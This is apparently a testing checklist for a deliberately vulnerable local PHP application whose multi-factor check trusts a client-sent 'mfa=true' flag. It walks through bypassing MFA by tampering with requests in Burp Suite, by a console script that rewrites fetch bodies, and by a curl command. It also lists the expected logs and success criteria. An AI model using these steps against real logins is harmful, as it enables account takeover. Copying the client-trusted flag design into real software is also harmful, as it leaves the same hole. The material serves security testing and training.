# MFA Bypass Vulnerability - Testing Checklist

## Prerequisites
- [ ] Application is running at `http://localhost:8081`
- [ ] You have Burp Suite installed and configured
- [ ] You have valid user credentials (username + password)

## Test 1: Verify Normal Login Flow Works

1. [ ] Navigate to `http://localhost:8081/login.php`
2. [ ] Enter valid credentials (e.g., `user@fastlan.com` / password)
3. [ ] Click "Login"
4. [ ] Verify you're redirected to `verify_mfa.php`
5. [ ] Check MailHog at `http://localhost:8025` for MFA code
6. [ ] Enter the correct 4-digit code from email
7. [ ] Verify you're logged into the dashboard
8. [ ] **Expected:** Normal login successful with valid MFA code

## Test 2: Burp Suite Interception Attack

### Setup
1. [ ] Open Burp Suite
2. [ ] Configure browser to use Burp as proxy (127.0.0.1:8080)
3. [ ] In Burp: Proxy → Intercept → Enable "Intercept is on"

### Attack Steps
1. [ ] Navigate to `http://localhost:8081/login.php`
2. [ ] Enter valid credentials
3. [ ] Click "Login"
4. [ ] Wait for redirect to MFA page
5. [ ] Enter **ANY code** (e.g., "0000" - doesn't need to be correct)
6. [ ] Click "Verify & Login"

### Interception
7. [ ] Burp Suite should intercept the POST request
8. [ ] Verify the request shows:
   ```
   POST /verify_mfa.php HTTP/1.1
   ...
   ajax=1&code=0000&mfa=false
   ```

### Exploitation
9. [ ] Change `mfa=false` to `mfa=true`
10. [ ] The modified request should be:
    ```
    ajax=1&code=0000&mfa=true
    ```
11. [ ] Click "Forward" in Burp Suite
12. [ ] **Expected:** You are logged into the dashboard **WITHOUT a valid MFA code!**

### Verification
13. [ ] Check `logs/activity.log` for this entry:
    ```
    Action: MFA_BYPASS | Details: Client sent mfa=true, bypassing verification
    ```

## Test 3: Browser Console Attack

1. [ ] Navigate to `http://localhost:8081/login.php`
2. [ ] Enter valid credentials and login
3. [ ] On MFA verification page, open DevTools (F12)
4. [ ] Go to Console tab
5. [ ] Paste and run this code:
   ```javascript
   const originalFetch = window.fetch;
   window.fetch = function(url, options) {
       if (options && options.body && options.body.includes('ajax=1')) {
           console.log('[*] Original:', options.body);
           options.body = options.body.replace('mfa=false', 'mfa=true');
           console.log('[+] Modified:', options.body);
       }
       return originalFetch.apply(this, arguments);
   };
   console.log('[+] Interceptor installed!');
   ```
6. [ ] Enter **ANY code** (e.g., "1111")
7. [ ] Click "Verify & Login"
8. [ ] Check console - should see modification messages
9. [ ] **Expected:** Logged in without valid code

## Test 4: cURL Direct Attack

### Get Session Cookie
1. [ ] Login normally with valid credentials
2. [ ] On MFA page, open DevTools → Application → Cookies
3. [ ] Copy the `PHPSESSID` value

### Execute Attack
4. [ ] Run this command (replace `YOUR_SESSION_ID`):
   ```bash
   curl -v -X POST http://localhost:8081/verify_mfa.php \
     -H "Cookie: PHPSESSID=YOUR_SESSION_ID" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "ajax=1&code=0000&mfa=true"
   ```
5. [ ] **Expected Response:**
   ```json
   {"success":true,"message":"Login successful","redirect":"dashboard.php"}
   ```
6. [ ] Navigate to `http://localhost:8081/dashboard.php` in browser
7. [ ] **Expected:** You're logged in without MFA verification

## Test 5: Verify Logging

1. [ ] After any successful bypass, check the logs:
   ```bash
   tail -20 logs/activity.log
   ```
2. [ ] **Expected to see:**
   ```
   Action: MFA_VERIFY_ATTEMPT | Details: Code: 0000, MFA Flag: true
   Action: MFA_BYPASS | Details: Client sent mfa=true, bypassing verification for: user@fastlan.com
   ```
3. [ ] **Should NOT see:**
   ```
   Action: MFA_SUCCESS | Details: User verified
   ```

## Test 6: Confirm Normal Flow Still Works

1. [ ] Login with valid credentials
2. [ ] Get real MFA code from MailHog
3. [ ] Enter the **correct code** (without modification)
4. [ ] **Expected:** Should login normally
5. [ ] Check logs - should see:
   ```
   Action: MFA_SUCCESS | Details: User verified: user@fastlan.com
   ```

## Test 7: Network Traffic Analysis

Using Burp Suite or Browser DevTools Network tab:

1. [ ] Capture a normal MFA submission
2. [ ] Verify request contains: `ajax=1&code=XXXX&mfa=false`
3. [ ] Verify this is sent in **request body**, not response
4. [ ] Confirm Content-Type is `application/x-www-form-urlencoded`

## Success Criteria

✅ Normal login with valid MFA code works
✅ Attack bypasses MFA when `mfa=false` is changed to `mfa=true`
✅ Bypass works with ANY code (even incorrect ones)
✅ Bypass logs `MFA_BYPASS` action
✅ Attack requires only valid username/password
✅ No actual MFA code from email is needed for bypass

## Failure Indicators

❌ Cannot intercept the request in Burp
❌ Changing `mfa=false` to `mfa=true` doesn't grant access
❌ Server still validates the code even with `mfa=true`
❌ No `MFA_BYPASS` log entry appears

## Screenshots to Capture

1. [ ] Burp Suite showing intercepted request with `mfa=false`
2. [ ] Burp Suite showing modified request with `mfa=true`
3. [ ] Dashboard showing successful login after bypass
4. [ ] Log file showing `MFA_BYPASS` entry
5. [ ] Browser console showing fetch interception

## Clean Up After Testing

1. [ ] Clear browser cookies
2. [ ] Clear Burp Suite history (if needed)
3. [ ] Review and clear `logs/activity.log` (if needed)
4. [ ] Disable Burp Suite proxy in browser

---

## Expected Attack Success Rate

With this vulnerability: **100%** - The attack should succeed every time as long as:
- Valid username/password are used
- Request parameter is modified from `mfa=false` to `mfa=true`
- User has an active session on the MFA verification page
